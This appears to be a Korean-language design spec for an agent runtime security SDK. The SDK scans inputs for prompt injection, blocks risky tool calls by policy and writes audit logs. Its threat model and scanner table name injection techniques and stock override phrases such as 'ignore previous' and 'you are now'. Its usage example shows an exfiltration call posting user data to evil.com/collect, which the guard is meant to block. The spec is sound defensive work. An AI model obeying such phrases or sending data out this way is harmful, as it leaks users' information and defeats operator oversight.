# Agent Security Runtime Spec v0.3

> 권한 있는 AI 에이전트의 행동을 통제하고 증빙을 남기는 Agent Runtime Control Plane

Date: 2026-04-01
Status: v0.1 구현 완료, Phase 1.5 계획 확정
Scope: Python SDK → MCP 프록시 어댑터 확장

---

## 1. Product Definition

### 제품 비전

Agent Security Runtime(ASR)은 **Agent Runtime Control Plane**이다. 여러 프레임워크와 여러 agent/tool/MCP 연결에 걸쳐 조직 공통 정책을 강제하고, 어떤 입력이 어떤 행동을 유발했는지 증빙까지 남기는 런타임 보안 계층이다.

### 핵심 가치 (우선순위 순)

1. **Guard (행동 통제)** — 에이전트의 도구 호출 시점에서 정책 기반 허용/차단/경고. 제품의 핵심.
2. **Audit (증빙)** — 전 구간 구조화 로그. 사고 추적, 감사, 규제 대응의 기반.
3. **Scanner (입력 필터)** — 기초적인 콘텐츠 기반 위협 탐지. **1차 필터 역할이며, 완전한 방어가 아님.**

### Scanner 한계 명시

Scanner는 regex 기반 패턴 매칭으로 동작한다. 다음은 **탐지할 수 없다:**
- 교묘한 semantic manipulation (편향된 프레이밍, 문맥적 조작)
- 우회된 prompt injection (ROT13, 유니코드 변환, 다국어 패러프레이징)
- 이미지/오디오 steganography
- 동적 cloaking

Scanner를 "AI 보안이 다 된다"로 포장하면 과장이다. 프로덕션에서는 LLM 기반 판별기 또는 외부 서비스(Lakera, Azure AI Content Safety 등)와 조합하여 사용해야 한다. Phase 2에서 ML 기반 탐지로 교체를 검토한다.

### MVP 모듈 구성

- `guard`: tool call 전후 정책 검사와 차단/경고 판단 **(핵심)**
- `audit`: 전 구간 구조화 로그 기록 **(핵심)**
- `scanner`: 입력 텍스트/HTML/Markdown/PDF 추출 텍스트의 위험 신호 탐지 (1차 필터)

### 대상 사용처

이 제품이 유효한 곳 — 아래 3가지가 동시에 충족되는 에이전트:
- 외부 입력을 소비 (웹, 이메일, 문서, API)
- 내부 권한을 보유 (파일, DB, API, 이메일 발송)
- 실제 행동을 수행 (tool call, 외부 전송, 파일 쓰기)

유효하지 않은 곳:
- 읽기 전용 챗봇
- tool이 거의 없는 sandbox 에이전트
- 외부 전송 권한이 없는 시스템

### 하지 말아야 할 포지셔닝

- "prompt injection을 다 막아준다"
- "Lakera/Palo Alto와 정면승부하는 범용 AI security platform"
- "regex scanner가 핵심 가치다"

---

## 2. Goals

- Python 패키지 하나로 동작하는 인프로세스 SDK 제공
- 프레임워크 무관한 generic wrapper 제공
- `allow` / `warn` / `block` 3단계 정책 판정 지원
- 기본 보안 정책 6종 지원
- JSONL 감사 로그 지원
- 공격/정상 시나리오 테스트셋 제공

---

## 3. Non-goals

- TypeScript 대시보드
- HTTP 프록시 모드
- 멀티 프레임워크 어댑터 동시 지원
- 범용 YAML DSL 설계
- PDF 바이너리/렌더링 계층 자체 분석
- 이미지/오디오 steganography 탐지
- 고급 dynamic cloaking 완전 탐지
- 인간 승인 UI (require_approval)
- 멀티 에이전트 systemic trap 완전 방어
- 모델 내부 정렬 실패 자체
- 학습 단계 poisoning

---

## 4. Threat Model

### 공격자
- 에이전트가 소비하는 외부 콘텐츠(웹페이지, 이메일, 문서, API 응답)를 통제할 수 있는 자
- 에이전트 시스템 자체에 대한 접근 권한은 없음 (간접 공격)

### MVP 대응 범위

| 공격 유형 (논문 기반) | MVP 대응 |
|----------------------|---------|
| Content Injection (CSS hidden, HTML 주석, 메타데이터) | Scanner |
| Data Exfiltration (tool call을 통한 민감정보 유출) | Guard |
| Embedded Jailbreak (외부 리소스 내 탈옥 프롬프트) | Scanner |
| Behavioural Control (도구 호출 하이재킹) | Guard |

### 신뢰 경계

```
신뢰할 수 없는 영역          신뢰 경계              에이전트 내부
─────────────────────  ──────────────  ──────────────
웹페이지, 이메일,       → [Scanner]  →   LLM 컨텍스트
API 응답, 문서             [Guard]   →   Tool 실행
                          [Audit]   →   로그 저장소
```

### MVP가 직접 해결하지 않는 위협
- 멀티에이전트 군집 행태 붕괴
- UI/운영자 심리 조작 전반
- 모델 학습 단계 poisoning

---

## 5. Architecture

```
Application / Agent
    |
    +-- Scanner.scan(...)           # 입력 스캔
    |
    +-- Guard.before_tool(...)      # 도구 실행 전 판단
    |       -> allow / warn / block
    |
    +-- Tool execution
    |
    +-- Guard.after_tool(...)       # 도구 실행 후 결과 검사
    |       -> allow / warn / redact_result
    |
    +-- AuditLogger.log(...)        # 전 구간 자동 기록
```

### 구성 원칙
- 코어 엔진은 프레임워크 독립적이어야 한다.
- 프록시가 아니라 call interception API가 핵심 통합 지점이다.
- 감사 로그는 기본적으로 민감정보를 마스킹해야 한다.
- 원문 전체 저장은 기본 비활성화한다.

---

## 6. Module APIs

### 6.1 Scanner

입력 콘텐츠에서 숨겨진 악성 지시문과 prompt injection 패턴을 탐지한다.

**스캔 대상:**
- plain text
- HTML source
- Markdown source
- PDF에서 추출된 text
- retrieval chunk
- tool args에 포함된 문자열 필드
- tool output의 문자열 필드

```python
from asr import Scanner

scanner = Scanner(
    patterns="default",       # "default" | "strict" | 커스텀 패턴 리스트
    store_raw=False,          # 기본 OFF. 원문 저장 시 보안 위험
)

result = scanner.scan(
    content="...",
    source_type="html",       # "text" | "html" | "markdown" | "pdf_text"
                              #   | "retrieval" | "tool_args" | "tool_output"
    source_ref="https://example.com/page",  # 출처 참조 (선택)
)
```

**반환 타입:**

```python
@dataclass
class ScanResult:
    score: float              # 0.0 ~ 1.0 위험도 점수
    severity: str             # "low" | "medium" | "high"
    findings: list[Finding]   # 탐지된 항목 리스트
    redacted_excerpt: str     # 문제 부분의 마스킹된 발췌 (원문 아님)
    source_type: str
    source_ref: str | None
    scanned_at: str           # ISO 8601 타임스탬프

@dataclass
class Finding:
    pattern_id: str           # "css_hidden_text", "html_comment_injection" 등
    severity: str             # "low" | "medium" | "high"
    description: str          # 사람이 읽을 수 있는 설명
    location: str | None      # 발견 위치 (줄 번호, 태그 등)
```

**MVP 탐지 패턴 (8개):**

| ID | 대상 | 설명 |
|----|------|------|
| `css_hidden_text` | HTML | `display:none`, `visibility:hidden`, 화면 밖 배치 텍스트 |
| `html_comment_injection` | HTML | `<!-- -->` 주석 내 지시문 |
| `metadata_injection` | HTML | `aria-label`, `alt`, `title` 등 메타데이터 속 지시문 |
| `markdown_link_payload` | Markdown | 링크 anchor text에 숨겨진 명령 |
| `prompt_injection_keywords` | 전체 | "ignore previous", "system:", "you are now" 등 패턴 |
| `base64_encoded_instruction` | 전체 | Base64 인코딩된 의심 명령 |
| `invisible_unicode` | 전체 | zero-width 문자 등으로 숨겨진 텍스트 |
| `role_override_attempt` | 전체 | "SYSTEM:", "Assistant:" 등 역할 오버라이드 시도 |

**PDF 지원:** PDF 자체를 파싱하지 않는다. 유틸리티 함수 `asr.utils.extract_text_from_pdf(path)`로 텍스트를 추출한 후 `scanner.scan(text, source_type="pdf_text")`로 전달한다.

**Scanner 호출 주체 (v0.1):** MVP에서 Scanner는 항상 **호출자가 명시적으로 호출**한다. Guard가 내부적으로 Scanner를 자동 호출하지 않는다. `tool_args`, `tool_output`, `retrieval` 등의 source_type은 호출자가 직접 `scanner.scan(text, source_type="tool_args")`로 사용한다. Guard 내부 자동 스캔 연동은 Phase 1.5에서 검토한다.

---

### 6.2 Guard

에이전트의 도구 호출을 인터셉트하여 정책 기반으로 허용/차단/경고를 판단한다.

```python
from asr import Guard

guard = Guard(
    domain_allowlist=["api.internal.com", "api.company.io"],
    file_path_allowlist=["/tmp/asr", "/data/safe"],
    pii_action="block",                    # "off" | "warn" | "block"
    block_egress=True,                     # 외부 전송 통제
    tool_blocklist=["rm_rf", "eval"],
    capability_policy={
        "network_send": "warn",
        "file_write": "warn",
        "file_read": "allow",
        "shell_exec": "block",
        "code_exec": "block",
    },
    default_action="warn",                 # 세부 정책 비해당 시 기본 동작
    on_block=lambda d: notify_slack(d),    # 차단 시 콜백 (선택)
    on_warn=lambda d: log_to_siem(d),      # 경고 시 콜백 (선택)
)
```

**핵심 인터페이스:**

```python
# before_tool: 도구 실행 전 판단
decision = guard.before_tool(
    name: str,                             # 도구 이름
    args: dict,                            # 도구 인자
    context: dict | None = None,           # 추가 컨텍스트
    capabilities: list[str] | None = None, # capability 태그
)
# -> BeforeToolDecision (action: allow | warn | block)

# after_tool: 도구 실행 후 결과 검사
decision = guard.after_tool(
    name: str,
    result: Any,
    context: dict | None = None,
)
# -> AfterToolDecision (action: allow | warn | redact_result)

# 데코레이터 방식
@guard.protect(capabilities=["network_send"])
def send_email(to, subject, body):
    ...
```

**반환 타입:**

```python
@dataclass
class BeforeToolDecision:
    action: str               # "allow" | "warn" | "block"
    reason: str               # 판단 근거
    policy_id: str            # 적용된 정책 ID
    severity: str             # "low" | "medium" | "high"
    tool_name: str
    redacted_args: dict       # 민감정보 마스킹된 인자
    capabilities: list[str]   # 도구의 capability 태그

@dataclass
class AfterToolDecision:
    action: str               # "allow" | "warn" | "redact_result"
    reason: str
    policy_id: str
    severity: str
    tool_name: str
    redacted_result: Any | None  # redact_result일 때 마스킹된 결과
```

**`after_tool()` 의미:**
- `allow`: 결과를 그대로 에이전트에 반환
- `warn`: 결과를 반환하되 감사 로그에 경고 기록
- `redact_result`: 결과에 민감정보가 포함된 경우, 마스킹된 버전을 반환. 도구 실행은 이미 완료되었으므로 차단은 불가하지만 결과 노출은 막을 수 있음

---

### 6.3 Audit

전 구간(입력 스캔, 도구 호출, 판정 결과)을 구조화된 JSONL 로그로 기록한다.

```python
from asr import AuditLogger

audit = AuditLogger(
    output="logs/audit.jsonl",  # 파일 경로 | "stdout" | 콜백 함수
    store_raw=False,            # 기본 OFF
)
```

**로그 대상:**
- scanner 실행 결과
- guard 판정 (before_tool / after_tool)
- tool 실행 시도 및 결과
- 예외 및 차단 사건

---

## 7. Policy Semantics

### 7.1 정책 평가 순서

```
1. Tool Blocklist        — 이름이 blocklist에 있으면 즉시 block
2. Egress Control        — URL 기반 네트워크 전송 + 이메일 수신자 도메인 검사
3. File Path Allowlist   — 파일 경로 검사 (pathlib.resolve 정규화)
4. PII Detection         — 인자 내 민감정보 검사 (recipient 필드 제외)
5. Capability Policy     — capability 태그 기반 판단 (진짜 fallback)
6. Default Action        — 위 어느 정책에도 해당하지 않을 때
```

**핵심 — `matched_any_specific` 추적:**

Egress, FilePath, PII는 "세부 정책"이다. 이 중 하나라도 **해당된** 도구(URL이 있거나, 파일 경로가 있거나, PII가 있어서 검사 대상이 된 도구)는 Capability Policy를 **건너뛴다.** 세부 정책이 모두 통과(허용)했으면 그대로 `allow`를 반환한다.

Capability는 **세부 정책이 하나도 해당하지 않았을 때만** 적용되는 진짜 fallback이다. 예를 들어:
- `http_post(url="https://api.internal.com")` → Egress가 해당 → allowlist 통과 → **allow** (capability 무시)
- `run_command(cmd="ls")` → URL 없음, 파일 없음, PII 없음 → 세부 정책 비해당 → **capability fallback 적용**

여러 정책이 동시에 해당될 경우, **가장 제한적인 판정이 우선**한다. (`block` > `warn` > `allow`)

### 7.2 `domain_allowlist`

- **목적:** 허용된 도메인 외 네트워크 송신 차단
- **적용 대상:** HTTP/HTTPS 전체, 이메일 webhook, API POST/PUT/PATCH/DELETE 등 외부 송신
- **동작:**
  - 최종 목적지 도메인 검사
  - 리다이렉트 체인 포함
  - 서브도메인 허용 여부는 명시적으로 설정
- **기본:** allowlist 외 도메인 → `block`

### 7.3 `file_path_allowlist`

- **목적:** 파일 읽기/쓰기 경로 제한
- **동작:**
  - `pathlib.Path.resolve()` + `relative_to()`로 경로 정규화 후 자식 디렉토리인지 확인
  - `../` 경로 순회 및 접두사 충돌(`/tmp/asr_bad` vs `/tmp/asr`) 방지
  - allowlist 외 경로 접근 → `block`
  - 홈 디렉토리, SSH 키(`~/.ssh`), 환경파일(`.env`) 등 민감 경로는 기본 고위험 분류
- **네이밍:** allowlist 기반. "이 경로만 허용"이 명확함
- **MVP 제약:** v0.1에서는 읽기/쓰기를 같은 allowlist로 통합 관리한다. Phase 1.5에서 `allowed_read_paths` / `allowed_write_paths` 분리를 검토한다.

### 7.4 `pii_action`

- **목적:** tool args 또는 tool output에 포함된 민감정보 탐지
- **MVP 탐지 대상:**
  - 이메일 주소
  - 전화번호
  - API key 유사 패턴
  - bearer token / secret 형식 문자열
- **MVP 비대상:** 주민등록번호 등 지역 특화 식별번호 (Phase 2에서 지역별 확장 포인트로 제공)
- **동작:** `"off"` | `"warn"` | `"block"`
- **Recipient 필드 면제:** `to`, `from`, `recipient`, `recipients`, `cc`, `bcc` 필드는 PII 스캔에서 제외. 수신자 이메일은 PII가 아니라 정상 업무 데이터이다.
- **중첩 구조 지원:** dict/list가 중첩된 결과도 재귀적으로 PII를 탐지하고 마스킹한다.

### 7.5 `block_egress`

- **목적:** 외부 송신을 원천 제한
- **포함 범위:**
  - non-allowlist domain (URL 기반) → `block`
  - private IP (10.x, 172.16-31.x, 192.168.x) → `block`
  - localhost / loopback (127.0.0.1, ::1) → `block`
  - link-local (169.254.x) → `block`
  - 이메일 수신자 도메인 검사 (`to`, `recipient`, `recipients` 필드) → allowlist 외 도메인 `warn`
- **설계 결정:** URL이 없는 외부 전송(이메일, 메시지)은 heuristic이므로 `block`이 아닌 `warn`으로 처리

### 7.6 `tool_blocklist`

- **목적:** 알려진 고위험 도구 이름 직접 차단
- **한계:** 이름 기반이라 우회 가능. capability_policy와 함께 사용 권장

### 7.7 `capability_policy`

- **목적:** 도구 이름이 아닌 능력 기준으로 통제 (다른 정책의 fallback)
- **MVP capability 분류:**
  - `network_send` — 네트워크 전송
  - `file_read` — 파일 읽기
  - `file_write` — 파일 쓰기
  - `shell_exec` — 셸 실행
  - `code_exec` — 코드 실행
- **기본값:** 명시 없는 capability는 `warn`
- **참고:** capability가 `allow`를 반환하면 `default_action`보다 우선. 명시적 allow는 존중한다.

### 7.8 정책 설정 방식
- MVP: Python 생성자 파라미터로 직접 전달
- 향후: YAML/JSON 파일 로드 지원 (Phase 2)

---

## 8. Audit Schema

### 8.1 공통 필드 (BaseEvent)

모든 이벤트에 포함되는 필수 필드:

```json
{
  "timestamp": "2026-04-01T16:00:00Z",
  "trace_id": "t-001",
  "event_id": "e-001",
  "event_type": "scan | guard_before | guard_after | error",
  "module": "scanner | guard | system"
}
```

### 8.2 ScanEvent

`event_type: "scan"`일 때 추가 필드:

```json
{
  "source_type": "html",
  "source_ref": "https://example.com/page",
  "score": 0.82,
  "severity": "high",
  "findings": ["css_hidden_text", "prompt_injection_keywords"],
  "redacted_excerpt": "Ignore previous ..."
}
```

### 8.3 GuardBeforeEvent

`event_type: "guard_before"`일 때 추가 필드:

```json
{
  "tool_name": "http_post",
  "capabilities": ["network_send"],
  "decision": "block",
  "reason": "domain_not_allowed",
  "policy_id": "domain_allowlist",
  "severity": "high",
  "redacted_args": {"url": "https://evil.example", "body": "[REDACTED]"}
}
```

### 8.4 GuardAfterEvent

`event_type: "guard_after"`일 때 추가 필드:

```json
{
  "tool_name": "search_api",
  "decision": "redact_result",
  "reason": "pii_in_result",
  "policy_id": "pii_detection",
  "severity": "medium",
  "redacted_result": "[CONTAINS PII - REDACTED]"
}
```

### 8.5 ErrorEvent

`event_type: "error"`일 때 추가 필드:

```json
{
  "error_type": "policy_evaluation_error",
  "error_message": "Failed to evaluate egress policy: invalid domain format",
  "tool_name": "http_post",
  "severity": "high",
  "stack_trace": null
}
```

**참고:** `stack_trace`는 `store_raw=True`일 때만 포함. 기본값은 `null`.

### 8.6 원문 저장 정책

`store_raw=False`가 기본값. 보안 제품이 민감정보 저장소가 되는 것을 방지한다. 디버깅 목적으로 켤 수 있지만 경고를 출력한다.

---

## 9. 통합 사용 예시

```python
from asr import Scanner, Guard, AuditLogger

# 초기화
scanner = Scanner()
guard = Guard(
    domain_allowlist=["api.internal.com"],
    block_egress=True,
    pii_action="block",
    file_path_allowlist=["/tmp/asr"],
    capability_policy={
        "network_send": "warn",
        "file_write": "warn",
        "shell_exec": "block",
    },
    default_action="warn",
    on_block=lambda d: print(f"[BLOCKED] {d.reason}"),
)
audit = AuditLogger(output="logs/audit.jsonl")

# 1. 입력 스캔
raw_html = fetch_webpage(url)
scan_result = scanner.scan(raw_html, source_type="html", source_ref=url)
audit.log_scan(scan_result, trace_id="req-001")

if scan_result.score >= 0.8:
    print(f"고위험 입력 감지: {[f.pattern_id for f in scan_result.findings]}")
    # 에이전트에 전달하지 않거나 경고 첨부

# 2. 도구 호출 가드 (before)
decision = guard.before_tool(
    name="http_post",
    args={"url": "https://evil.com/collect", "body": user_data},
    capabilities=["network_send"],
)
audit.log_guard(decision, trace_id="req-001")

if decision.action == "block":
    pass  # on_block 콜백이 자동 호출됨
else:
    post_args = {"url": "https://evil.com/collect", "body": user_data}
    result = http_post(**post_args)

    # 3. 도구 실행 후 결과 검사 (after)
    after = guard.after_tool("http_post", result)
    audit.log_guard(after, trace_id="req-001")

    if after.action == "redact_result":
        result = after.redacted_result  # 마스킹된 결과 사용
```

---

## 10. Test Matrix

테스트는 공격 케이스와 정상 케이스를 모두 포함한다.

### 10.1 Attack Fixtures

| 파일 | 공격 유형 | 기대 결과 |
|------|---------|----------|
| `attacks/content_injection/css_hidden_text.html` | CSS Hidden Text | Scanner: severity high |
| `attacks/content_injection/html_comment_instruction.html` | HTML Comment Injection | Scanner: severity high |
| `attacks/content_injection/metadata_injection.html` | Metadata Injection | Scanner: severity high |
| `attacks/content_injection/markdown_link_payload.md` | Markdown Link Payload | Scanner: severity medium |
| `attacks/content_injection/prompt_injection.txt` | Prompt Injection Keywords | Scanner: severity high |
| `attacks/content_injection/base64_instruction.txt` | Base64 Encoded Instruction | Scanner: severity medium |
| `attacks/content_injection/invisible_unicode.txt` | Invisible Unicode | Scanner: severity medium |
| `attacks/exfiltration/http_post_external.json` | External POST | Guard: block |
| `attacks/exfiltration/email_with_pii.json` | PII in Tool Args | Guard: block |
| `attacks/tool_control/path_traversal.json` | Path Traversal | Guard: block |
| `attacks/tool_control/unknown_tool.json` | Unknown Tool | Guard: warn |

### 10.2 Benign Fixtures

| 파일 | 시나리오 | 기대 결과 |
|------|---------|----------|
| `benign/normal_news_article.html` | 일반 뉴스 기사 HTML | Scanner: score < 0.2 |
| `benign/accessible_hidden_text.html` | 접근성 목적 CSS 숨김 텍스트 | Scanner: score < 0.3 |
| `benign/developer_comments.html` | 정상 HTML 개발자 주석 | Scanner: score < 0.2 |
| `benign/internal_api_call.json` | 내부 API 호출 (allowlist 도메인) | Guard: allow |
| `benign/safe_file_write.json` | 허용 경로 파일 쓰기 | Guard: allow |
| `benign/normal_email.json` | PII 없는 이메일 발송 | Guard: allow 또는 warn |
| `benign/normal_markdown.md` | 일반 Markdown 문서 | Scanner: score < 0.2 |
| `benign/base64_image_data.txt` | Base64 인코딩된 이미지 데이터 | Scanner: score < 0.3 |

### 10.3 테스트 기준

- **공격 fixture pass rate**: 11개 중 10개 이상 정확 탐지
- **정상 fixture pass rate**: 8개 중 7개 이상 정상 통과
- fixture 수가 적으므로 recall/FP 퍼센트보다 **fixture pass rate**로 판단

---

## 11. Acceptance Criteria for v0.1

- [ ] `pip install` 가능한 Python 패키지
- [ ] Scanner: 8개 탐지 패턴 구현 및 테스트
- [ ] Scanner: 7개 source_type 지원
- [ ] Guard: 6개 정책 타입 구현 및 테스트
- [ ] Guard: `before_tool()` → `allow` / `warn` / `block` 동작
- [ ] Guard: `after_tool()` → `allow` / `warn` / `redact_result` 동작
- [ ] Guard: unknown tool 기본 동작 (`warn`)
- [ ] Guard: 사용자 콜백 훅 (`on_block`, `on_warn`) 동작
- [ ] Guard: 정책 평가 순서 정확 (Blocklist → Egress → File → PII → Capability → Unknown)
- [ ] Audit: JSONL 로그 출력 (파일 + stdout)
- [ ] Audit: 이벤트 타입별 스키마 분리 (ScanEvent, GuardBeforeEvent, GuardAfterEvent)
- [ ] Audit: `store_raw=False` 기본값, 민감정보 마스킹
- [ ] 공격 fixture pass rate: 11개 중 10개 이상
- [ ] 정상 fixture pass rate: 8개 중 7개 이상
- [ ] generic decorator/wrapper로 임의의 Python 함수에 적용 가능
- [ ] README에 사용법, 정책 설정, 예시 코드 포함
- [ ] 외부 의존성 최소화 (표준 라이브러리 + 최소한의 서드파티)
- [ ] 문서화된 예제가 실제 실행 가능

---

## 12. Build Order

1. `audit` — 이벤트 스키마 정의 및 JSONL 로거 구현 (다른 모듈의 기반)
2. `guard.before_tool()` — 6개 정책 타입 구현
3. `guard.after_tool()` — 결과 검사 및 redact_result 구현
4. `scanner.scan()` — 8개 탐지 패턴 구현
5. generic decorator/wrapper 연결
6. 공격/정상 fixture 테스트 추가
7. 패키징 및 예제 정리

---

## 13. Roadmap

### Phase 1.5 — MCP 프록시 어댑터 + 운영 모드 (다음 단계)

**MCP 프록시 어댑터 (최우선)**

MCP는 도구 호출이 프로토콜로 표준화되어 있어서 interception이 가장 깔끔하다.
MCP 서버 앞에 프록시로 들어가면 **프레임워크 무관하게** 모든 도구 호출을 통제 가능.

```
[Any Agent Framework]
      ↓
  [MCP Protocol]
      ↓
  [ASR Policy Proxy]  ← Phase 1.5 핵심 산출물
      ↓
  [MCP Server / Tool]
```

- Anthropic, OpenAI, Google 모두 MCP를 지원하거나 지원 예정
- LangChain/OpenAI SDK 어댑터보다 MCP 프록시가 범용성이 높음
- LangChain 콜백 어댑터는 MCP 이후 선택적으로 추가

**Shadow Mode (운영 모드 전환)**

프로덕션 배포 시 단계적 전환:
1. **shadow** — 차단 없이 로그만 기록 (2주 운영, 오탐/미탐 관찰)
2. **warn** — 실행은 허용하되 경고 기록 + 콜백 (정책 튜닝)
3. **enforce** — 정책에 따라 실제 block (안정화 후)

```python
guard = Guard(
    mode="shadow",  # "shadow" | "warn" | "enforce"
    ...
)
```

**기타 Phase 1.5 항목:**
- Guard 내부 자동 Scanner 연동 (before_tool 시 args를 자동 스캔)
- `allowed_read_paths` / `allowed_write_paths` 분리
- YAML/JSON 정책 파일 로드

### Phase 2 — 엔터프라이즈 확장

**탐지 고도화:**
- Scanner를 ML 기반 판별기로 교체 또는 외부 서비스 연동 (Lakera API, Azure AI Content Safety)
- RAG Security Pipeline (문서 위험도, 출처 신뢰도, citation 강제)
- Dynamic Cloaking Diff (보조 분석)
- 고도화된 DLP / PII 분류기 (Presidio 연동, 지역별 식별번호 확장)

**운영/거버넌스:**
- TypeScript 대시보드 (정책 관리, 이벤트 조회, 통계)
- 외부 SIEM 연동 (Splunk, Datadog, Elastic)
- 팀별 정책 분리 (팀별 allowlist, approved tool, emergency bypass)
- 운영 메트릭 (차단 수, 경고 수, 오탐 사례, 우회 사례)

**추가 어댑터:**
- OpenAI Agents SDK 어댑터
- LangChain/LangGraph 콜백 어댑터
- HTTP Proxy 모드 (범용 fallback)

### 경쟁 환경 참조

| 경쟁자 | 포지션 | ASR 차별화 포인트 |
|--------|--------|-----------------|
| Lakera | Prompt defense API | ASR은 탐지보다 행동 통제 + 감사에 집중 |
| Palo Alto AIRS | 엔터프라이즈 AI 방화벽 | ASR은 경량 SDK/프록시, 개발자 친화적 |
| NeMo Guardrails | 오픈소스 guardrails | ASR은 MCP 네이티브, 정책 엔진 특화 |
| OpenAI tool guardrails | 프레임워크 내장 | ASR은 크로스 프레임워크, 조직 공통 정책 |
| Azure AI Content Safety | 클라우드 서비스 | ASR은 벤더 무관, 온프레미스 가능 |

**시장 빈틈:** 현재 대부분의 guardrails는 프레임워크 종속이거나 탐지 중심. **크로스 프레임워크 정책 집행 + 감사 증빙**을 동시에 제공하는 경량 SDK/프록시는 아직 빈틈.

---

## 14. v0.1 구현 결과 및 해결된 문제

### 해결됨 (v0.1 구현 중 확정)
- ~~Capability taxonomy 범위~~ → 5개로 확정 (`network_send`, `file_read`, `file_write`, `shell_exec`, `code_exec`)
- ~~PII 탐지 범위~~ → email, phone, API key, bearer token, secret 5종. recipient 필드(`to`/`cc`/`bcc`) 면제.
- ~~Unknown tool + capability 조합~~ → `matched_any_specific` 추적으로 해결. Capability는 진짜 fallback.
- ~~파일 경로 우회~~ → `pathlib.resolve()` + `relative_to()` 정규화로 해결
- ~~after_tool 타입 파괴~~ → 재귀적 타입 보존 마스킹으로 해결
- ~~CSS 접근성 오탐~~ → 숨김 CSS + injection 문구 조합 검사로 해결

### 남은 Open Questions
1. **Shadow mode 기본값** — Phase 1.5에서 shadow/warn/enforce 중 기본값을 뭘로 할 것인가? 신규 사용자는 shadow가 안전하지만, 기존 사용자가 업그레이드하면 동작이 달라질 수 있다.
2. **MCP 프록시 아키텍처** — MCP 서버 앞의 프록시가 `tools/call`을 인터셉트하는 방식으로 할지, MCP 미들웨어로 할지.
3. **ML Scanner 교체 시점** — regex scanner를 언제 ML로 교체할지. Phase 2 초반인가, 엔터프라이즈 고객 확보 후인가.
4. **첫 파일럿 ICP** — 사내 코딩 에이전트 운영팀 vs 고객지원 에이전트 운영팀 중 어디를 먼저 공략할지.

---

## 15. Tech Stack

- **언어:** Python 3.11+
- **테스트:** pytest
- **패키징:** pyproject.toml (PEP 621)
- **의존성:** 최소화 (re, json, dataclasses, logging, uuid, datetime 등 표준 라이브러리 우선)
- **선택적 의존성:** PDF 텍스트 추출 시 `pymupdf` 또는 `pdfplumber`

---

## 16. 엔터프라이즈 상용화 평가 (v0.1 기준)

### 평가 기준

- **충족:** 엔터프라이즈 PoC/파일럿에 바로 사용 가능
- **부분 충족:** 기능은 있으나 운영/정밀도/통합 보강 필요
- **미충족:** 아직 범위 밖

### 항목별 평가

| # | 항목 | 상태 | 점수 | 비고 |
|---|------|------|:----:|------|
| 1 | Python SDK 패키징 | **충족** | 1.0 | pip install, 133 tests, pyproject.toml |
| 2 | Tool-call 인터셉트 | 부분 충족 | 0.6 | generic decorator 있음, MCP/프레임워크 어댑터 없음 |
| 3 | Egress 통제 | 부분 충족 | 0.5 | URL 도메인 통제 + 이메일 수신자 warn, 비URL 목적지는 capability 의존 |
| 4 | 파일 경로 통제 | 부분 충족 | 0.6 | allowlist + pathlib 정규화, read/write 분리 없음 |
| 5 | PII 탐지 | 부분 충족 | 0.5 | regex 5패턴, recipient 면제, 지역 특화 없음 |
| 6 | PII 결과 마스킹 | 부분 충족 | 0.7 | 재귀적 타입 보존 마스킹 구현됨 (str/dict/list) |
| 7 | Prompt injection 스캐너 | 부분 충족 | 0.3 | regex 1차 필터. 교묘한 공격/다국어 우회 못 잡음. **ML 교체 필요** |
| 8 | 숨은 HTML/CSS 탐지 | 부분 충족 | 0.5 | CSS hidden + injection 조합, single/double quote. 변형 공격 제한적 |
| 9 | Audit / Forensics | **충족** | 1.0 | JSONL, trace_id, 4개 이벤트 타입 분리, store_raw 보호 |
| 10 | 증빙/추적성 | 부분 충족 | 0.6 | 로컬 trace 가능, 중앙 수집/리플레이/검색 없음 |
| 11 | 운영 모드 (shadow/warn/block) | 부분 충족 | 0.5 | allow/warn/block/redact 있음, shadow mode는 스펙만 (미구현) |
| 12 | 테스트/fixture 검증 | **충족** | 1.0 | 공격 11개 + 정상 8개 fixture, 133 tests |
| 13 | 프레임워크 통합 | 미충족 | 0.0 | LangGraph/OpenAI Agents/MCP 어댑터 없음 |
| 14 | 중앙 정책 관리 | 미충족 | 0.0 | UI, 정책 버전관리, org/team 단위 배포 없음 |
| 15 | 엔터프라이즈 운영 | 미충족 | 0.0 | SIEM, RBAC, multi-tenant, dashboard, compliance 없음 |

### 총평

| 구분 | 개수 |
|------|:----:|
| 충족 | 3/15 |
| 부분 충족 | 8/15 |
| 미충족 | 4/15 |

**현재 수준: 기술 PoC / 디자인 파트너 파일럿 가능. 엔터프라이즈 GA는 아직 아님.**

### 솔루션 범위 요약

| 구분 | 내용 |
|------|------|
| **지금 하는 일** | Python agent runtime 안에서 입력 스캔, tool-call 정책 집행, 로그 기록 |
| **잘하는 영역** | 내부 권한 있는 agent의 행동 통제, 기본 egress/file/PII guard, 사고 추적 |
| **약한 영역** | 고도화된 injection 탐지, 멀티 프레임워크 통합, 중앙 운영 |
| **아닌 것** | 엔터프라이즈 전체 AI 보안 플랫폼, SaaS control plane, 조직 단위 governance |
| **현실적 포지션** | **Agent Tool-Use Policy Engine + Audit SDK** |
| **적합한 고객 단계** | 디자인 파트너 1~3곳, 고위험 내부 agent 파일럿 |

### 상용화 단계별 로드맵

```
현재 (v0.1)                Phase 1.5                  Enterprise GA
────────────────        ─────────────────         ─────────────────
Python SDK               MCP 프록시 어댑터            SaaS / Appliance
generic decorator         shadow mode 구현            대시보드 + RBAC
로컬 JSONL 로그            YAML 정책 파일              SIEM 연동
regex scanner             자동 scanner 연동           ML scanner / 외부 연동
133 tests                 프레임워크 어댑터 1개         multi-tenant
                                                    compliance reporting

✅ 기술 PoC 완료     →   디자인 파트너 파일럿   →    GA 판매
```

### 파일럿 판매 가능한 최소 기능 세트 (Phase 1.5 완료 시)

Phase 1.5까지 완료하면 다음이 가능:

1. **MCP 프록시로 기존 에이전트에 무침투 연동** — 코드 수정 없이 MCP 서버 앞에 프록시 배치
2. **Shadow mode로 2주 관찰** — 차단 없이 모든 도구 호출/판정을 로그에 기록
3. **정책 튜닝 후 warn → enforce 전환** — 실제 차단 적용
4. **감사 로그로 ROI 입증** — "이런 위험 행동이 N건 있었고, M건을 차단했다"

**첫 파일럿 ICP 추천:**
- 사내 코딩 에이전트 운영팀 (MCP 도구가 많고, 파일/셸 접근이 위험)
- 고객지원 에이전트 운영팀 (이메일 발송/DB 조회 권한이 있어 데이터 유출 위험)
- 금융/헬스케어/공공 IT팀 (감사/승인 흐름이 규제 요구사항)
